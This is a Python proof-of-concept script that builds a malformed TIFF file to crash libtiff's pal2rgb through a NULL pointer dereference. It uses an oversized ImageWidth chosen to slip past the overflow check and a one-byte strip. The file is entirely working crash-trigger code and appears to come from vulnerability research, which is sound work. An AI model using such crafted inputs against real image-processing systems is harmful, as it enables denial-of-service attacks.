#!/usr/bin/env python3
"""
PoC generator for VULN 002: NULL pointer dereference in pal2rgb
Root cause: _TIFFmalloc(TIFFScanlineSize(in)) with large imagewidth
returns NULL, then TIFFReadScanline writes to NULL -> SIGSEGV/crash

imagewidth = 0x1FFFFFFF (536870911) is chosen because:
  - For 8bpp: multiply(0x1FFFFFFF, 8) = 0xFFFFFFF8 which fits in uint32
  - TIFFScanlineSize = 536870911 bytes (~512MB) - no overflow check triggered
  - _TIFFmalloc(536870911) in ASAN build may fail -> NULL dereference
  - Even if malloc succeeds, StripByteCounts=1 vs 512MB scanline causes crash
Note: 0xFFFFFFFF triggers "Integer overflow in TIFFScanlineSize" protection
"""
import struct

# Layout:
# Offset 0:   8 bytes  - TIFF header
# Offset 8:   2 bytes  - IFD entry count (10)
# Offset 10:  120 bytes - 10 IFD entries (12 bytes each)
# Offset 130: 4 bytes  - next IFD offset (0)
# Total IFD block ends at offset 134
# Offset 134: 1536 bytes - Colormap (768 SHORTs, all zeros)
# Offset 1670: 1 byte  - strip data (0x00)

COLORMAP_OFFSET = 134
STRIP_OFFSET = 1670

# Use 0x1FFFFFFF: largest width that doesn't trigger uint32 overflow in
# TIFFScanlineSize's internal multiply(width*8) check for 8bpp images
IMAGEWIDTH = 0x1FFFFFFF  # 536870911

# TIFF header: little-endian, magic 0x002A, IFD at offset 8
header = b'\x49\x49\x2a\x00' + struct.pack('<I', 8)

# IFD entries (12 bytes each), tags in ascending order
entries = b''

# 0x0100 ImageWidth = IMAGEWIDTH (LONG, type=4)
entries += struct.pack('<HHI', 0x0100, 4, 1) + struct.pack('<I', IMAGEWIDTH)

# 0x0101 ImageLength = 1 (LONG, type=4)
entries += struct.pack('<HHI', 0x0101, 4, 1) + struct.pack('<I', 1)

# 0x0102 BitsPerSample = 8 (SHORT, type=3)
entries += struct.pack('<HHI', 0x0102, 3, 1) + struct.pack('<HH', 8, 0)

# 0x0103 Compression = 1 no compression (SHORT, type=3)
entries += struct.pack('<HHI', 0x0103, 3, 1) + struct.pack('<HH', 1, 0)

# 0x0106 PhotometricInterpretation = 3 PALETTE (SHORT, type=3)
entries += struct.pack('<HHI', 0x0106, 3, 1) + struct.pack('<HH', 3, 0)

# 0x0111 StripOffsets = STRIP_OFFSET (LONG, type=4, count=1)
entries += struct.pack('<HHI', 0x0111, 4, 1) + struct.pack('<I', STRIP_OFFSET)

# 0x0115 SamplesPerPixel = 1 (SHORT, type=3)
entries += struct.pack('<HHI', 0x0115, 3, 1) + struct.pack('<HH', 1, 0)

# 0x0116 RowsPerStrip = 1 (LONG, type=4)
entries += struct.pack('<HHI', 0x0116, 4, 1) + struct.pack('<I', 1)

# 0x0117 StripByteCounts = 1 (LONG, type=4)
# Only 1 byte of strip data declared, but scanline needs 512MB
entries += struct.pack('<HHI', 0x0117, 4, 1) + struct.pack('<I', 1)

# 0x0140 Colormap = 768 SHORTs at COLORMAP_OFFSET (SHORT, type=3, count=768)
entries += struct.pack('<HHI', 0x0140, 3, 768) + struct.pack('<I', COLORMAP_OFFSET)

assert len(entries) == 10 * 12, f"Expected 120 bytes of entries, got {len(entries)}"

# IFD block: count + entries + next IFD
ifd_block = struct.pack('<H', 10) + entries + struct.pack('<I', 0)
assert len(ifd_block) == 126, f"IFD block length {len(ifd_block)}, expected 126"

# Colormap: 768 SHORTs all zeros (1536 bytes)
colormap = b'\x00' * (768 * 2)
assert len(colormap) == 1536

# Strip data: 1 byte (claimed 512MB scanline but only 1 byte present)
strip_data = b'\x00'

# Build file
tiff_data = header + ifd_block + colormap + strip_data

assert len(tiff_data) == 1671, f"File length {len(tiff_data)}, expected 1671"

out_file = 'vuln_002.tif'
with open(out_file, 'wb') as f:
    f.write(tiff_data)

scanline = IMAGEWIDTH  # 1spp, 8bpp -> scanline = width
print(f"[+] Written {len(tiff_data)} bytes to {out_file}")
print(f"    ImageWidth  = 0x{IMAGEWIDTH:08X} ({IMAGEWIDTH})")
print(f"    ImageLength = 1, RowsPerStrip = 1")
print(f"    BitsPerSample = 8, SamplesPerPixel = 1")
print(f"    PhotometricInterpretation = 3 (PALETTE)")
print(f"    Colormap at offset {COLORMAP_OFFSET} ({len(colormap)} bytes)")
print(f"    Strip data at offset {STRIP_OFFSET} (1 byte only)")
print(f"    TIFFScanlineSize = {scanline} bytes ({scanline/(1024*1024):.1f} MB)")
print(f"[+] Expected crash: _TIFFmalloc({scanline}) may -> NULL or"
      f" mismatched StripByteCounts(1) vs scanline({scanline})")
